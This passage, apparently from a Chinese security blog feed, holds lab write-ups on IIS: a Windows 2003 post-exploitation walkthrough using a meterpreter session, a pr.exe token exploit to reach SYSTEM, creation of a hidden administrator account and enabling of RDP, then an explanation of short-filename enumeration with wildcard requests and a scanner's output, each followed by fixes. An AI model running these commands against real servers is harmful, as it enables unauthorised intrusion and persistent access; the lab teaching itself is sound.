class="line">c:\windows\system32\inetsrv&gt;md 123</span><br><span class="line">md 123</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/186.png" alt="图片"></p><p>很显然不能，那么我们切换到<code>C</code>盘下再试试：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/187.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;md 123</span><br><span class="line">md 123</span><br><span class="line"></span><br><span class="line">C:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 88DC-ADF2</span><br><span class="line"></span><br><span class="line"> C:\ 的目录</span><br><span class="line"></span><br><span class="line">2019-08-05  13:42    &lt;DIR&gt;          123</span><br><span class="line">2019-08-03  12:18                 0 AUTOEXEC.BAT</span><br><span class="line">2019-08-03  12:18                 0 CONFIG.SYS</span><br><span class="line">2019-08-03  12:22    &lt;DIR&gt;          Documents and Settings</span><br><span class="line">2019-08-03  14:02    &lt;DIR&gt;          Inetpub</span><br><span class="line">2019-08-03  12:23    &lt;DIR&gt;          Program Files</span><br><span class="line">2019-08-03  14:02    &lt;DIR&gt;          WINDOWS</span><br><span class="line">2019-08-03  12:18    &lt;DIR&gt;          wmpub</span><br><span class="line">               2 个文件              0 字节</span><br><span class="line">               6 个目录 22,927,130,624 可用字节</span><br><span class="line"></span><br><span class="line">C:\&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个时候是可以创建文件夹<code>123</code>，但是权限还是很小，只是一个服务器权限。</p><p>我们回到会话窗口:<code>exit</code></p><p>使用<code>upload</code>命令在<code>home</code>目录上传<code>pr.exe</code>提权exp文件到<code>2003</code>服务器的<code>C:\\123</code>目录下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/188.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/189.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> : /home/pr.exe -&gt; c:\123</span><br><span class="line">[*] uploaded   : /home/pr.exe -&gt; c:\123\pr.exe</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>meterpreter</code>提示上传成功！我们切换到<code>shell</code>会话<code>C</code>盘下的<code>123</code>目录，看看<code>pr.exe</code>是否上传成功：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/190.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;dir</span><br><span class="line">dir</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 88DC-ADF2</span><br><span class="line"></span><br><span class="line"> C:\123 的目录</span><br><span class="line"></span><br><span class="line">2019-08-05  13:47    &lt;DIR&gt;          .</span><br><span class="line">2019-08-05  13:47    &lt;DIR&gt;          ..</span><br><span class="line">2019-08-05  13:47            73,728 pr.exe</span><br><span class="line">               1 个文件         73,728 字节</span><br><span class="line">               2 个目录 22,927,056,896 可用字节</span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure><p>成功上传<code>pr.exe</code>文件！我们首先执行一下<code>whoami</code>看看当前权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/191.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\network service</span><br></pre></td></tr></table></figure><p>权限很小！我们用<code>pr.exe</code>执行<code>whoami</code>看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/192.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe whoami</span><br><span class="line">pr.exe whoami</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>这个时候就是一个系统管理权限:<code>nt authority\system</code>!</p><h3 id="创建一个用户并提升为超级管理员权限"><a href="#创建一个用户并提升为超级管理员权限" class="headerlink" title="创建一个用户并提升为超级管理员权限"></a>创建一个用户并提升为超级管理员权限</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/193.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe &quot;net user liuwx liuwx123abc /add&quot;</span><br><span class="line">pr.exe &quot;net user liuwx liuwx123abc /add&quot;</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure><p>吧<code>liuwx</code>用户添加进<code>管理员</code>组：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/194.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe &quot;net localgroup administrators liuwx /add&quot;</span><br><span class="line">pr.exe &quot;net localgroup administrators liuwx /add&quot;</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 3852 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure><p>由于我们已经添加了一个超级管理员的账号，这个时候我们要使用刚刚创建的账号进行远程登录它的那台服务器，前提是对方服务器开启了<code>3389</code>端口.</p><h3 id="开启3389登录服务器"><a href="#开启3389登录服务器" class="headerlink" title="开启3389登录服务器"></a>开启3389登录服务器</h3><p>查看当前端口开放情况：</p><p><code>netstat -an</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/195.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;netstat -an </span><br><span class="line">netstat -an</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:139    0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:1046   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  TCP    192.168.119.134:1047   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  UDP    0.0.0.0:445            *:*                    </span><br><span class="line">  UDP    0.0.0.0:500            *:*                    </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                    </span><br><span class="line">  UDP    127.0.0.1:123          *:*                    </span><br><span class="line">  UDP    192.168.119.134:123    *:*                    </span><br><span class="line">  UDP    192.168.119.134:137    *:*                    </span><br><span class="line">  UDP    192.168.119.134:138    *:*                    </span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure><p>从上面可以看到，它没有开放<code>3389</code>端口！我们是不能够进行远程链接到2003主机的。</p><p>这个时候就要用到<code>3389</code>批处理工具：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/196.png" alt="图片"></p><p>吧<code>3389.bat</code>文件上传到<code>c:\\123</code>目录中：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/197.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x27;/home/3389.bat&#x27; c:\\123</span><br><span class="line">[*] uploading  : /home/3389.bat -&gt; c:\123</span><br><span class="line">[*] uploaded   : /home/3389.bat -&gt; c:\123\3389.bat</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/198.png" alt="图片"></p><p>成功上传！这个时候，我们就需要用<code>3389</code>这个提权工具开启远程服务器的<code>3389</code>端口：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/199.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">C:\123&gt;pr.exe 3389.bat</span><br><span class="line">pr.exe 3389.bat</span><br><span class="line">/xxoo/--&gt;Build&amp;&amp;Change By KOOPie</span><br><span class="line">/xxoo/--&gt;Got WMI process Pid: 2640 </span><br><span class="line">/xxoo/--&gt;Found token SYSTEM </span><br><span class="line">/xxoo/--&gt;Running command with SYSTEM Token...</span><br><span class="line">/xxoo/--&gt;Done, command should have ran as SYSTEM!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提示你：3389已经开启</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\123&gt;netstat -an</span><br><span class="line">netstat -an</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State</span><br><span class="line">  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:139    0.0.0.0:0              LISTENING</span><br><span class="line">  TCP    192.168.119.134:1047   192.168.119.136:4444   ESTABLISHED</span><br><span class="line">  UDP    0.0.0.0:445            *:*                    </span><br><span class="line">  UDP    0.0.0.0:500            *:*                    </span><br><span class="line">  UDP    0.0.0.0:4500           *:*                    </span><br><span class="line">  UDP    127.0.0.1:123          *:*                    </span><br><span class="line">  UDP    192.168.119.134:123    *:*                    </span><br><span class="line">  UDP    192.168.119.134:137    *:*                    </span><br><span class="line">  UDP    192.168.119.134:138    *:*                    </span><br><span class="line">本机的IP是192.168.119.134</span><br><span class="line"></span><br><span class="line">C:\123&gt;</span><br></pre></td></tr></table></figure><p>这个时候，服务器的<code>3389</code>服务就已经被开启了！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/200.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/201.png" alt="图片"></p><p>这个就是整个提权的一个过程，包括成功的登陆到远程服务器！</p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1、关闭<code>WebDAV</code>服务</p><p>2、使用相关防护设备</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS-短文件名猜解漏洞</title>
      <link href="/2019/08/02/IIS-2/"/>
      <url>/2019/08/02/IIS-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=518894119&auto=1&height=66"></iframe><h2 id="短文件名介绍"><a href="#短文件名介绍" class="headerlink" title="短文件名介绍"></a>短文件名介绍</h2><p>为了兼容<code>16</code>位<code>MS-DOS</code>程序，Windows为文件名较长的文件（和文件夹）生成了对应的<code>Windows 8.3</code>短文件名。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/170.png" alt="图片"></p><h2 id="短文件名的查看"><a href="#短文件名的查看" class="headerlink" title="短文件名的查看"></a>短文件名的查看</h2><p>首先在C盘下多创建几个文件：（有不同的后缀名，都是比较长的文件名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaa.txt</span><br><span class="line">bbbbbbbbbbbb.asp</span><br><span class="line">abcdefghijk.txt</span><br><span class="line">abcdefghig.php</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/171.png" alt="图片"></p><p>打开<code>命令提示符</code>，来到<code>C盘</code>下，查看短文件名的命名方式：<code>dir /x</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/172.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;dir /x</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 509E-D608</span><br><span class="line"></span><br><span class="line"> C:\ 的目录</span><br><span class="line"></span><br><span class="line">2019-08-02  12:37                 0 AAAAAA~1.TXT aaaaaaaaaaaaa.txt</span><br><span class="line">2019-08-02  12:47                 0              abc.txt</span><br><span class="line">2019-08-02  12:39                 0 ABCDEF~1.PHP abcdefghig.php</span><br><span class="line">2019-08-02  12:39                 0 ABCDEF~1.TXT abcdefghijk.txt</span><br><span class="line">2019-07-23  11:47                 0              AUTOEXEC.BAT</span><br><span class="line">2019-08-02  12:37                 0 BBBBBB~1.ASP bbbbbbbbbbbbbb.aspx</span><br><span class="line">2019-07-23  11:47                 0              CONFIG.SYS</span><br><span class="line">2019-07-23  11:49    &lt;DIR&gt;          DOCUME~1     Documents and Settings</span><br><span class="line">2019-07-23  11:59    &lt;DIR&gt;          FPSE_S~1     FPSE_search</span><br><span class="line">2019-07-23  11:59    &lt;DIR&gt;                       Inetpub</span><br><span class="line">2019-07-23  11:51    &lt;DIR&gt;          PROGRA~1     Program Files</span><br><span class="line">2019-07-23  13:17    &lt;DIR&gt;                       WINDOWS</span><br><span class="line">2019-07-23  11:47    &lt;DIR&gt;                       wmpub</span><br><span class="line">               7 个文件              0 字节</span><br><span class="line">               6 个目录 28,107,870,208 可用字节</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们第一个文件：<code>aaaaaaaaaaaaa.txt</code>这个文件，他显示的短文件名形式是大写的<code>AAAAAA~1.TXT</code></p><p><code>abcdefghig.php</code>这个文件，他显示的短文件名形式也是大写的<code>ABCDEF~1.PHP</code></p><p>后面的也一样，只保留前<code>六位数</code>的<code>文件名</code> + <code>～</code> + <code>1.后缀名</code></p><p>这时候，我们再创建一个文件:<code>abc.txt</code>,然后在用<code>dir /x</code>查看一下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/173.png" alt="图片"></p><p>可以看到，前面并没有短文件名，因为它本身长度就不是特别的长！</p><p>从以上实验得出短文件名的特征：</p><h2 id="短文件名特征"><a href="#短文件名特征" class="headerlink" title="短文件名特征"></a>短文件名特征</h2><p>1、只有<code>前六位</code>字符直接显示，后续字符用<code>~1</code>指代。其中数字<code>1</code>还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）</p><p>2、后缀名最长只有<code>3</code>位，多余的被截断，超过3位的长文件会生成短文件名</p><p>3、所有<code>小写字母</code>都会转换成<code>大写字母</code></p><p>4、长文件名中含有多个<code>.</code>,以文件名最后一个<code>.</code>作为短文件名后缀</p><p>5、长文件名前缀/文件夹名字符长度符合<code>0-9</code>和<code>Aa-Zz</code>范围且需要<code>大于等于9位</code>才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>攻击者使用通配符<code>*</code>和<code>?</code>发生一个请求到<code>IIS</code>，当IIS接收到一个文件路径中包含<code>~</code>请求时，它的反应是不同的，即返回的<code>HTTP状态码</code>和错误信息不同。基于这个特点，可以根据HTTP的响应区分一个可用或者不可用的文件。访问构造的某个<code>存在</code>的短文件名，会返回<code>404</code>；访问构造的某个<code>不存在</code>的短文件名，会返回<code>400</code>（报错页面）</p><h2 id="IIS短文件猜解漏洞复现（手工测试）"><a href="#IIS短文件猜解漏洞复现（手工测试）" class="headerlink" title="IIS短文件猜解漏洞复现（手工测试）"></a>IIS短文件猜解漏洞复现（手工测试）</h2><p>因为我开着<code>IIS</code>的虚拟机的IP是<code>192.168.119.133</code>,所以我直接访问这个URL：</p><blockquote><p><a href="http://192.168.119.133/a*~1*/.aspx">http://192.168.119.133/a*~1*/.aspx</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/174.png" alt="图片"></p><p><code>/a*~1*/</code>的意思就是，用<code>首字母a</code>这个字符去匹配,也就是首字母<code>a</code>是否<code>存在</code>这个短文件名。<code>~1</code>这个和上面的短文件名特征是一样的，代表了它是一个短文件名。</p><p>如果说这个页面返回的状态码是<code>404</code>的话，那么这个短文件名是<code>存在</code>的！如果返回的是<code>400</code>,泽说明这个短文件名是<code>不存在</code>的!</p><p>从上图可以得出，返回的页面状态码是<code>404</code>,说明网站更目录下有一个文件是以<code>a</code>开头的短文件名。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/175.png" alt="图片"></p><p><code>aspnet_client</code>这个文件夹是<code>iis</code>自带的文件夹目录，所以会显示存在！</p><p>这个时候我们测试一个不存在的文件或者文件名:</p><p>访问URL：</p><blockquote><p><a href="http://192.168.119.133/c*~1*/.aspx">http://192.168.119.133/c*~1*/.aspx</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/176.png" alt="图片"></p><p>返回的状态码是<code>400</code>,说明<code>不存在</code>以<code>c</code>开头的短文件名。</p><h2 id="IIS短文件名猜解漏洞复现（工具测试）"><a href="#IIS短文件名猜解漏洞复现（工具测试）" class="headerlink" title="IIS短文件名猜解漏洞复现（工具测试）"></a>IIS短文件名猜解漏洞复现（工具测试）</h2><p>用到的工具来自<code>Github</code>上的IIS短文件名猜解工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用法是:iis_shortname_Scan.py 目标主机</span><br><span class="line"></span><br><span class="line">python iis_shortname_Scan.py http://192.168.119.133</span><br></pre></td></tr></table></figure><p>用之前，我们先把刚刚创建的那些文件复制到我们的网站更目录，然后再使用：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/177.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">E:\HACK\IIS短文件名猜解工具\IIS_shortname_Scanner&gt;python iis_shortname_Scan.py h</span><br><span class="line">ttp://192.168.119.133</span><br><span class="line">Server is vulnerable, please wait, scanning...</span><br><span class="line">[+] /a~1.*      [scan in progress]</span><br><span class="line">[+] /b~1.*      [scan in progress]</span><br><span class="line">[+] /ab~1.*     [scan in progress]</span><br><span class="line">[+] /aa~1.*     [scan in progress]</span><br><span class="line">[+] /bb~1.*     [scan in progress]</span><br><span class="line">[+] /as~1.*     [scan in progress]</span><br><span class="line">[+] /abc~1.*    [scan in progress]</span><br><span class="line">[+] /aaa~1.*    [scan in progress]</span><br><span class="line">[+] /bbb~1.*    [scan in progress]</span><br><span class="line">[+] /asp~1.*    [scan in progress]</span><br><span class="line">[+] /abcd~1.*   [scan in progress]</span><br><span class="line">[+] /aaaa~1.*   [scan in progress]</span><br><span class="line">[+] /bbbb~1.*   [scan in progress]</span><br><span class="line">[+] /aspn~1.*   [scan in progress]</span><br><span class="line">[+] /abcde~1.*  [scan in progress]</span><br><span class="line">[+] /aaaaa~1.*  [scan in progress]</span><br><span class="line">[+] /bbbbb~1.*  [scan in progress]</span><br><span class="line">[+] /aspne~1.*  [scan in progress]</span><br><span class="line">[+] /abcdef~1.* [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.* [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.* [scan in progress]</span><br><span class="line">[+] /aspnet~1.* [scan in progress]</span><br><span class="line">[+] /abcdef~1.p*        [scan in progress]</span><br><span class="line">[+] /abcdef~1.t*        [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.t*        [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.a*        [scan in progress]</span><br><span class="line">[+] /aspnet~1   [scan in progress]</span><br><span class="line">[+] Directory /aspnet~1 [Done]</span><br><span class="line">[+] /abcdef~1.ph*       [scan in progress]</span><br><span class="line">[+] /abcdef~1.tx*       [scan in progress]</span><br><span class="line">[+] /aaaaaa~1.tx*       [scan in progress]</span><br><span class="line">[+] /bbbbbb~1.as*       [scan in progress]</span><br><span class="line">[+] /abcdef~1.php*      [scan in progress]</span><br><span class="line">[+] File /abcdef~1.php* [Done]</span><br><span class="line">[+] /abcdef~1.txt*      [scan in progress]</span><br><span class="line">[+] File /abcdef~1.txt* [Done]</span><br><span class="line">[+] /aaaaaa~1.txt*      [scan in progress]</span><br><span class="line">[+] File /aaaaaa~1.txt* [Done]</span><br><span class="line">[+] /bbbbbb~1.asp*      [scan in progress]</span><br><span class="line">[+] File /bbbbbb~1.asp* [Done]</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">Dir:  /aspnet~1</span><br><span class="line">File: /abcdef~1.php*</span><br><span class="line">File: /abcdef~1.txt*</span><br><span class="line">File: /aaaaaa~1.txt*</span><br><span class="line">File: /bbbbbb~1.asp*</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">1 Directories, 4 Files found in total</span><br><span class="line">Note that * is a wildcard, matches any character zero or more times.</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/178.png" alt="图片"></p><p>可以从上图中对照一下看看，成功猜解出我们网站更目录下的短文件名！</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、升级<code>.net framework</code></p><p>2、修改注册表键值：</p><blockquote><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</p></blockquote><p>修改<code>NtfsDisable8dot3NameCreation</code>为<code>1</code>，<code>1</code>代表不创建短文件名格式，修改完成后，需要重启系统生效。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/179.png" alt="图片"></p><p>本篇完~</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> IIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IIS-PUT漏洞</title>
      <link href="/2019/07/23/IIS-1/"/>
      <url>/2019/07/23/IIS-1/</url>
      
